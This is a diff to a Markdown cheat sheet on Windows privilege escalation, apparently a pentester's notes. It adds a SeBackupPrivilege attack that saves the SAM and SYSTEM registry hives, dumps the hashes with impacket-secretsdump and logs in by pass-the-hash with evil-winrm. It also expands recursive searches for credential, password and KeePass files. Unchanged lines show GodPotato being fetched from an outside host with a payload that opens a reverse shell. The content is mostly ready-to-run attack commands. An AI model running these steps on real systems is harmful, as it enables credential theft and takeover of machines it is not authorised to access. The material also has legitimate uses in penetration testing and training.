@@ -7,6 +7,8 @@ Index
 - [SeImpersonatePrivilege](#SeImpersonatePrivilege)
     - [Exploit by PrintSpoofer64](#Exploit-by-PrintSpoofer64)
     - [Exploit by GodPotato](#Exploit-by-GodPotato)
+- [SeBackupPrivileges](#SeBackupPrivileges)
+    - [Exploit by secrets dump](#Exploit-by-secrets-dump)
 
 ## System Enumeration
 ### General Info
@@ -41,12 +43,14 @@ Get-History                             ## history
 ```
 Search information in file:
 ``` powershell
-Get-ChildItem -Path c:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue                             ## search for interesting file
-Get-ChildItem -Path c:\ -Include *.pdf -File -Recurse -ErrorAction SilentlyContinue                             ## search for interesting file
-Get-ChildItem -Path c:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue                            ## search for interesting file
+Get-ChildItem -Path c:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path c:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue 
+Get-ChildItem -Path c:\ -Include *.pdf -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path c:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path c:\ -Include *.zip -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path c:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue 
-Get-ChildItem -Path c:\ -Include credential* -File -Recurse -ErrorAction SilentlyContinue                       ## search for interesting file
-Get-ChildItem -Path c:\ -Include password* -File -Recurse -ErrorAction SilentlyContinue                         ## search for interesting file
+Get-ChildItem -Path c:\ -Include credential* -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path c:\ -Include password* -File -Recurse -ErrorAction SilentlyContinue
 
 Get-ChildItem -Path c:\ -Include *.git* -File -Recurse -ErrorAction SilentlyContinue                            ## search for git repo
 git log                                                                                                         ## check information in log
@@ -109,7 +113,7 @@ PRIVILEGES INFORMATION
 Privilege Name                Description                               State   
 ============================= ========================================= ========
 SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled     ## possibly vulnerable
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled     ## vulnerable
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
@@ -139,4 +143,38 @@ Exploit the system:
 iwr http://192.168.1.1:8888/payload.exe -outfile payload.exe                                    ## download payload on target system
 iwr http://192.168.1.1:8888/GodPotato.exe -outfile GodPotato.exe                                ## download exploit on target system
 ./GodPotato.exe -cmd "powershell /c ./payload.exe"                                              ## exploit: open a reverse shell
+```
+
+## SeBackupPrivileges
+### Exploit by secrets dump
+- Need access to the target system.
+- Verify user's privileges:
+``` powershell
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled    ## vulnerable
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+reg save hklm\sam c:\Temp\sam           ## copy on KALI
+reg save hklm\system c:\Temp\system     ## copy on KALI
+```
+
+From KALI, use impacket-secretsdump to extract the hashes, evil-winrm to login:
+``` bash
+impacket-secretsdump -sam sam -system system LOCAL
+
+[*] Target system bootKey: 0x00000000000000000000000000000000
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:00000000000000000000000000000000:00000000000000000000000000000000:::
+# user                                             # hash
+
+evil-winrm -i 192.168.1.1 -u Administrator -H 00000000000000000000000000000000
 ```
